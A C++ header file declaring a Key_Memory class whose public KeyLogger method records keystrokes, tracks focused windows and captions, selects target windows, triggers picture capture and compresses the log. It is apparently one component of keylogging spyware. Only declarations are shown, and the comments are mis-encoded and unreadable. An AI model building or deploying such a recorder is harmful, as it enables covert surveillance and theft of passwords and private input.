// Key_Memory.h: interface for the Key_Memory class.
//
//////////////////////////////////////////////////////////////////////

#include "Pack_Picture1.h"	// Added by ClassView
#include "MyCompress.h"

#if !defined(AFX_KEY_MEMORY_H__658049B9_201F_4303_8296_A2F1FD8DBE0B__INCLUDED_)
#define AFX_KEY_MEMORY_H__658049B9_201F_4303_8296_A2F1FD8DBE0B__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

class Key_Memory  
{
public:
	Key_Memory();
	virtual ~Key_Memory();
	BOOL KeyLogger(string &buffer);//buffer��������   n��¼���ڴ���
private:
	MyCompress my_compress;
	char *WindowCaption;
	HWND Old_hwnd;
	Pack_Picture picture;
	BOOL IsWindowsFocusChange();//�����Ƿ��Ѿ��ı�
	BOOL IsThisWindow();//�ǲ�����Ҫ��¼�Ĵ���
	BOOL NeedToPicture();
	int sum;//��Ч���ڵĸ���
	char total_keyboard[2048];//�ܼ�¼
	char *LowerCase[95];//���̷���
	char *UpperCase[95];//��д��ĸ
	int SpecialKeys[95];//�������
	char KeyBuffer[600];//��¼���� 
	HWND PreviousFocus;//���ھ��
};

#endif // !defined(AFX_KEY_MEMORY_H__658049B9_201F_4303_8296_A2F1FD8DBE0B__INCLUDED_)
